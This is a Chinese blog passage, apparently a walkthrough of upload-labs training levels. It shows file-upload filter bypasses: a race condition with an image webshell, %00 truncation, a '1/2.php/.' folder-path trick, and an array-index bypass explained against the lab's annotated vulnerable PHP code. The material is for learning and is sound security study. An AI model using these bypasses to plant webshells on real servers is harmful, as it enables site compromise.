我们在上传测试中也能发现

修改了名字

所以我们可以使用条件竞争

首先准备图片码

然后上传抓包和18一样操作

然后这里需要访问的是文件包含 因为我们上传的是GIF文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/6fcc07c51d1c9e08065a98a5d13d0c58.png" alt="" style="max-height:56px; box-sizing:content-box;" />


这个时候就上传成功了



<img src="https://i-blog.csdnimg.cn/blog_migrate/468ade6ac04ac01ff17a7b8dbeb36c2b.png" alt="" style="max-height:617px; box-sizing:content-box;" />


## Less-20 文件夹绕过 00截断

这里使用00 截断即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/c5277f4a72c11479a19582526131bba6.png" alt="" style="max-height:88px; box-sizing:content-box;" />


php

后面有 %00  但是是编码过的

还有一个是文件夹绕过

```cobol
1/2.php/.
```

这样是1文件夹下的2.php文件夹下的文件

这样因为/.不存在 所以会以文件夹的命名方式来创建一个2.php

但是2.php又是文件 所以会创建一个php文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/19a424ae70903f2c5675f2ff920749f1.png" alt="" style="max-height:537px; box-sizing:content-box;" />


这里就上传成功了

## Less-21  数组绕过

 [Upload-labs Pass-20 数组绕过_baynk的博客-CSDN博客](https://blog.csdn.net/u014029795/article/details/102917199?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169034508316800215040959%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=169034508316800215040959&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-102917199-null-null.142%5Ev91%5Einsert_down28v1,239%5Ev3%5Einsert_chatgpt&utm_term=upload-labs%2021%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187) 

首先解读一下源代码

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
这里就是检查MIME 可以通过BP抓包修改
 
 
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
这里注意 通过 .来分割 然后把小写的文件 作为两个数组
假如我们上传 shell.png  他就是 A=['shell','png']
        }
把所有变为小写
 
 
        $ext = end($file);
end(array)函数，输出数组中的当前元素和最后一个元素的值。
指针调位最后一个  png
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }
白名单
 
        else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值
shell 
count(array)函数，计算数组中的单元数目，或对象中的属性个数
就是数组个数-1然后拼接
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

 [PHP 在线工具 | 菜鸟工具](https://c.runoob.com/compile/1/) 

<img src="https://i-blog.csdnimg.cn/blog_migrate/b1b67e7711c6e02906aa66e2586ea583.png" alt="" style="max-height:238px; box-sizing:content-box;" />


如果我们指定这个把这个数组加到array[shell.php,null,jpg]

那count回来就是2



<img src="https://i-blog.csdnimg.cn/blog_migrate/28de97aab7f46fa9ba915fa096313c79.png" alt="" style="max-height:227px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/e233661bb8f8887707d751464cf8f8bd.png" alt="" style="max-height:145px; box-sizing:content-box;" />


这个时候数组里只有两个值

那么 2-1 =1 就会 但是 array[1] 没有内容



<img src="https://i-blog.csdnimg.cn/blog_migrate/01d3b1207fa39f3ea99c5c3544561199.png" alt="" style="max-height:227px; box-sizing:content-box;" />


不存在返回值 那么就为 ' ' 所以最后拼接就是 shell.php.

那么就成功绕过了

那我们开始做题

抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/958fa5560ef8af6db44ece2639561753.png" alt="" style="max-height:115px; box-sizing:content-box;" />


修改MIME



<img src="https://i-blog.csdnimg.cn/blog_migrate/4b83fc512c7a52e6b5a0da2797660a06.png" alt="" style="max-height:152px; box-sizing:content-box;" />


我们自己设定数组

这样就数组就是

```cobol
save_path[shell.php,NULL,png]
 
count为2
 
2-1=1 1为NULL
 
所以拼接就是 shell.php.''
 
其实就是 
 
shell.php.
```

这样就上传成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/391b11c629da779104f61d6461b93913.png" alt="" style="max-height:132px; box-sizing:content-box;" />